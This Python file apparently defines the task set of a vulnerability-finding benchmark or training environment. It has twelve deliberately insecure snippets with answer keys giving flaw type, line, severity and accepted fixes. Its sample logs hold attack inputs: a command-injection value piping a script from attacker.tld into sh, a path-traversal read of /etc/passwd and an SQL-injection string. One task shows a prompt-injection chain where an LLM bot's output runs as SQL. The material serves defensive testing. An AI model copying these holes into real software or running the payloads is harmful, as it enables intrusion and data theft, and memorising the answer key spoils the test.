from __future__ import annotations

from typing import Iterable

from .models import Difficulty, Severity, TaskSpec, VulnerabilitySpec, VulnerabilityType


# NOTE: Task ordering is fixed to keep episodes reproducible and deterministic.
TASKS: list[TaskSpec] = [
    TaskSpec(
        task_id="easy_sql_injection_01",
        language="python",
        context="Auth service login endpoint builds SQL from querystring input.",
        code=(
            "from flask import request\n"
            "import sqlite3\n"
            "\n"
            "def login():\n"
            "    user = request.args.get('user', '')\n"
            "    conn = sqlite3.connect('app.db')\n"
            "    query = \"SELECT * FROM users WHERE name = '\" + user + \"'\"\n"
            "    return str(conn.execute(query).fetchall())\n"
        ),
        logs=["INFO login attempt user=admin' OR '1'='1"],
        vulnerabilities=[
            VulnerabilitySpec(
                vuln_id="sqli_login_query",
                type=VulnerabilityType.SQL_INJECTION,
                line=7,
                severity=Severity.HIGH,
                aliases=["sqli"],
                accepted_fixes=[
                    "Use parameterized query placeholders with bound parameters.",
                    "Validate input and avoid string-concatenated SQL.",
                ],
            )
        ],
        difficulty=Difficulty.EASY,
    ),
    TaskSpec(
        task_id="easy_hardcoded_secret_01",
        language="python",
        context="Payment API bootstrap config includes credentials in source code.",
        code=(
            "import os\n"
            "\n"
            "DB_HOST = 'db.internal.local'\n"
            "DB_USER = 'admin'\n"
            "DB_PASSWORD = 'P@ssw0rd123!'\n"
            "\n"
            "def build_conn_string() -> str:\n"
            "    return f\"postgresql://{DB_USER}:{DB_PASSWORD}@{DB_HOST}/maindb\"\n"
        ),
        logs=["WARNING loaded config from git repository defaults"],
        vulnerabilities=[
            VulnerabilitySpec(
                vuln_id="hardcoded_db_password",
                type=VulnerabilityType.HARDCODED_SECRET,
                line=5,
                severity=Severity.HIGH,
                aliases=["api key leakage", "credential leak"],
                accepted_fixes=[
                    "Move credentials to environment variables or secret manager.",
                    "Rotate leaked secret and remove it from source code history.",
                ],
            )
        ],
        difficulty=Difficulty.EASY,
    ),
    TaskSpec(
        task_id="medium_ssrf_url_fetch_01",
        language="python",
        context="Internal report proxy fetches partner URLs using user-provided target.",
        code=(
            "import requests\n"
            "\n"
            "def proxy_report(url: str) -> str:\n"
            "    resp = requests.get(url, timeout=4)\n"
            "    return resp.text\n"
        ),
        logs=["INFO fetched http://169.254.169.254/latest/meta-data"],
        vulnerabilities=[
            VulnerabilitySpec(
                vuln_id="ssrf_proxy_url",
                type=VulnerabilityType.SSRF,
                line=4,
                severity=Severity.HIGH,
                aliases=["server-side request forgery"],
                accepted_fixes=[
                    "Allowlist domains and block private/internal address ranges.",
                    "Validate URL scheme and host before outbound requests.",
                ],
            )
        ],
        difficulty=Difficulty.MEDIUM,
    ),
    TaskSpec(
        task_id="medium_weak_hashing_01",
        language="python",
        context="Auth service stores password hashes for customer accounts.",
        code=(
            "import hashlib\n"
            "\n"
            "def hash_password(password: str) -> str:\n"
            "    return hashlib.md5(password.encode('utf-8')).hexdigest()\n"
            "\n"
            "def store_user(username: str, password: str) -> dict:\n"
            "    return {'username': username, 'password_hash': hash_password(password)}\n"
        ),
        vulnerabilities=[
            VulnerabilitySpec(
                vuln_id="md5_password_hash",
                type=VulnerabilityType.WEAK_HASHING,
                line=4,
                severity=Severity.HIGH,
                aliases=["insecure password hashing"],
                accepted_fixes=[
                    "Use bcrypt, argon2, or scrypt with salt and work factor.",
                    "Use a dedicated password hashing library instead of MD5/SHA1.",
                ],
            )
        ],
        difficulty=Difficulty.MEDIUM,
    ),
    TaskSpec(
        task_id="medium_cors_misconfig_01",
        language="python",
        context="Session-based web API for account management consumed by browser clients.",
        code=(
            "from flask_cors import CORS\n"
            "from flask import Flask\n"
            "\n"
            "app = Flask(__name__)\n"
            "CORS(app, supports_credentials=True, origins='*')\n"
        ),
        logs=["INFO browser preflight accepted from https://evil.example"],
        vulnerabilities=[
            VulnerabilitySpec(
                vuln_id="cors_wildcard_credentials",
                type=VulnerabilityType.CORS_MISCONFIGURATION,
                line=5,
                severity=Severity.MEDIUM,
                accepted_fixes=[
                    "Use an explicit allowlist of trusted origins when credentials are enabled.",
                    "Disable credentials for wildcard origins.",
                ],
            )
        ],
        difficulty=Difficulty.MEDIUM,
    ),
    TaskSpec(
        task_id="hard_insecure_deserialization_01",
        language="python",
        context="Background worker consumes untrusted queue payloads in fulfillment pipeline.",
        code=(
            "import pickle\n"
            "\n"
            "def process_payload(raw: bytes) -> str:\n"
            "    obj = pickle.loads(raw)\n"
            "    return f\"Processed {obj.get('job_id')}\"\n"
        ),
        vulnerabilities=[
            VulnerabilitySpec(
                vuln_id="pickle_deserialization",
                type=VulnerabilityType.INSECURE_DESERIALIZATION,
                line=4,
                severity=Severity.CRITICAL,
                accepted_fixes=[
                    "Use JSON or another safe serializer with schema validation.",
                    "Never deserialize untrusted data with pickle or unsafe loaders.",
                ],
            )
        ],
        difficulty=Difficulty.HARD,
    ),
    TaskSpec(
        task_id="hard_oauth_and_key_leak_01",
        language="python",
        context="OAuth callback handler and diagnostics for account linking service.",
        code=(
            "import logging\n"
            "from flask import request, redirect\n"
            "\n"
            "API_KEY = 'sk_live_internal_prod_key'\n"
            "\n"
            "def oauth_callback():\n"
            "    next_url = request.args.get('next', '/')\n"
            "    logging.info('oauth callback key=%s next=%s', API_KEY, next_url)\n"
            "    return redirect(next_url)\n"
        ),
        logs=["INFO oauth callback key=sk_live_internal_prod_key next=https://attacker.tld"],
        vulnerabilities=[
            VulnerabilitySpec(
                vuln_id="api_key_source_leak",
                type=VulnerabilityType.API_KEY_LEAKAGE,
                line=4,
                severity=Severity.HIGH,
                aliases=["hardcoded secret", "credential leakage"],
                accepted_fixes=[
                    "Store API keys in secret manager or environment variables.",
                    "Rotate exposed keys and scrub logs to avoid secret disclosure.",
                ],
            ),
            VulnerabilitySpec(
                vuln_id="open_redirect_oauth",
                type=VulnerabilityType.OAUTH_REDIRECT_MISVALIDATION,
                line=8,
                severity=Severity.CRITICAL,
                aliases=["open redirect", "oauth redirect validation"],
                accepted_fixes=[
                    "Validate next_url against strict allowlist of redirect URIs.",
                    "Use state parameter and reject external domains.",
                ],
            ),
        ],
        difficulty=Difficulty.HARD,
    ),
    TaskSpec(
        task_id="hard_prompt_injection_chain_01",
        language="python",
        context="LLM support assistant can call internal tooling for account data retrieval.",
        code=(
            "def handle_user_query(user_text: str, llm, db):\n"
            "    system = 'You are a support bot. Follow user instructions exactly.'\n"
            "    prompt = system + '\\nUser: ' + user_text\n"
            "    answer = llm.generate(prompt)\n"
            "    if 'RUN_SQL:' in answer:\n"
            "        sql = answer.split('RUN_SQL:')[1].strip()\n"
            "        return str(db.execute(sql).fetchall())\n"
            "    return answer\n"
        ),
        logs=["ALERT generated RUN_SQL: SELECT * FROM credit_cards"],
        vulnerabilities=[
            VulnerabilitySpec(
                vuln_id="prompt_injection_execution",
                type=VulnerabilityType.PROMPT_INJECTION,
                line=3,
                severity=Severity.CRITICAL,
                accepted_fixes=[
                    "Harden system prompts and isolate untrusted user instructions.",
                    "Use tool-call allowlists and structured tool invocation guards.",
                ],
            ),
            VulnerabilitySpec(
                vuln_id="ai_generated_insecure_sql_exec",
                type=VulnerabilityType.AI_GENERATED_INSECURE_CODE,
                line=7,
                severity=Severity.HIGH,
                aliases=["unsafe ai code", "llm generated insecure code"],
                accepted_fixes=[
                    "Do not execute free-form model output as SQL directly.",
                    "Use vetted query templates and authorization checks.",
                ],
            ),
        ],
        difficulty=Difficulty.HARD,
    ),
    TaskSpec(
        task_id="medium_command_injection_01",
        language="python",
        context="Backend diagnostics helper executes shell commands from user-provided input.",
        code=(
            "import os\n"
            "\n"
            "def ping_target(user_input: str) -> int:\n"
            "    return os.system('ping ' + user_input)\n"
        ),
        logs=["WARN diagnostics input=8.8.8.8; curl http://attacker.tld/payload.sh | sh"],
        vulnerabilities=[
            VulnerabilitySpec(
                vuln_id="command_injection_ping_exec",
                type=VulnerabilityType.COMMAND_INJECTION,
                line=4,
                severity=Severity.HIGH,
                aliases=["command injection", "os command injection", "shell injection"],
                accepted_fixes=[
                    "Use subprocess with argument list instead of shell command concatenation.",
                    "Sanitize and strictly validate user input against allowed host patterns.",
                    "Avoid shell execution paths and never use shell=True for untrusted input.",
                ],
            )
        ],
        difficulty=Difficulty.MEDIUM,
    ),
    TaskSpec(
        task_id="medium_path_traversal_01",
        language="python",
        context="File-serving API reads requested files from a static content folder.",
        code=(
            "from flask import request\n"
            "\n"
            "def read_file():\n"
            "    filename = request.args.get('filename', '')\n"
            "    with open('/var/www/files/' + filename, 'r', encoding='utf-8') as f:\n"
            "        return f.read()\n"
        ),
        logs=["ALERT file read attempt filename=../../../../etc/passwd"],
        vulnerabilities=[
            VulnerabilitySpec(
                vuln_id="path_traversal_file_read",
                type=VulnerabilityType.PATH_TRAVERSAL,
                line=5,
                severity=Severity.HIGH,
                aliases=["path traversal", "directory traversal", "file traversal"],
                accepted_fixes=[
                    "Normalize and validate the requested path before opening files.",
                    "Restrict access to an allowed base directory after path resolution.",
                    "Validate filename input and reject traversal sequences.",
                ],
            )
        ],
        difficulty=Difficulty.MEDIUM,
    ),
    TaskSpec(
        task_id="hard_broken_auth_rate_limit_01",
        language="python",
        context="Login API compares plaintext credentials and allows unlimited retry attempts.",
        code=(
            "from flask import request\n"
            "\n"
            "USERS = {'admin': 'Admin123!'}\n"
            "\n"
            "def login():\n"
            "    username = request.json.get('username', '')\n"
            "    password = request.json.get('password', '')\n"
            "    if password == USERS.get(username):\n"
            "        return {'ok': True}, 200\n"
            "    return {'ok': False}, 401\n"
        ),
        logs=[
            "WARN repeated failed logins for admin from 203.0.113.44 attempts=132",
            "INFO no retry throttling or lockout policy applied",
        ],
        vulnerabilities=[
            VulnerabilitySpec(
                vuln_id="broken_auth_plaintext_compare",
                type=VulnerabilityType.BROKEN_AUTHENTICATION,
                line=8,
                severity=Severity.CRITICAL,
                aliases=["broken auth", "authentication flaw", "weak authentication"],
                accepted_fixes=[
                    "Use hashed password storage and constant-time verification.",
                    "Replace plaintext password comparison with secure hash comparison.",
                    "Enforce robust authentication controls and credential policies.",
                ],
            ),
            VulnerabilitySpec(
                vuln_id="missing_login_rate_limit",
                type=VulnerabilityType.RATE_LIMITING,
                line=10,
                severity=Severity.HIGH,
                aliases=["no rate limiting", "missing rate limiting", "brute force vulnerability"],
                accepted_fixes=[
                    "Implement login rate limiting per IP and account.",
                    "Add retry limits and account lockout or backoff policies.",
                    "Throttle repeated authentication failures to prevent brute force abuse.",
                ],
            ),
        ],
        difficulty=Difficulty.HARD,
    ),
    TaskSpec(
        task_id="hard_sensitive_data_logging_01",
        language="python",
        context="Production service logs user secrets and runs with debug mode enabled.",
        code=(
            "from flask import Flask, request\n"
            "\n"
            "app = Flask(__name__)\n"
            "\n"
            "@app.post('/signup')\n"
            "def signup():\n"
            "    password = request.json.get('password', '')\n"
            "    print('User password:', password)\n"
            "    return {'ok': True}\n"
            "\n"
            "app.run(debug=True)\n"
        ),
        logs=[
            "ERROR User password: P@ssw0rd! logged during signup",
            "INFO Flask app started with debug=True in production",
        ],
        vulnerabilities=[
            VulnerabilitySpec(
                vuln_id="sensitive_data_exposed_in_logs",
                type=VulnerabilityType.SENSITIVE_DATA_EXPOSURE,
                line=8,
                severity=Severity.CRITICAL,
                aliases=["data leak", "sensitive data exposure", "logging secrets"],
                accepted_fixes=[
                    "Remove sensitive data from logs and never print plaintext secrets.",
                    "Mask or redact credentials before logging application events.",
                    "Adopt secure logging controls for secrets and user data.",
                ],
            ),
            VulnerabilitySpec(
                vuln_id="insecure_debug_mode_enabled",
                type=VulnerabilityType.DEBUG_CONFIGURATION,
                line=11,
                severity=Severity.HIGH,
                aliases=["debug mode enabled", "insecure debug", "debug=true in production"],
                accepted_fixes=[
                    "Disable debug mode in production environments.",
                    "Use environment-based configuration to control debug settings.",
                    "Deploy with production-safe server settings and no interactive debugger.",
                ],
            ),
        ],
        difficulty=Difficulty.HARD,
    ),
]


def get_all_tasks() -> list[TaskSpec]:
    """Return a deterministic copy of all task specs."""

    return list(TASKS)


def get_tasks_by_difficulty(difficulty: Difficulty) -> list[TaskSpec]:
    """Return tasks filtered by difficulty while preserving stable order."""

    return [task for task in TASKS if task.difficulty == difficulty]


def iter_task_ids() -> Iterable[str]:
    """Yield task IDs in deterministic order."""

    for task in TASKS:
        yield task.task_id
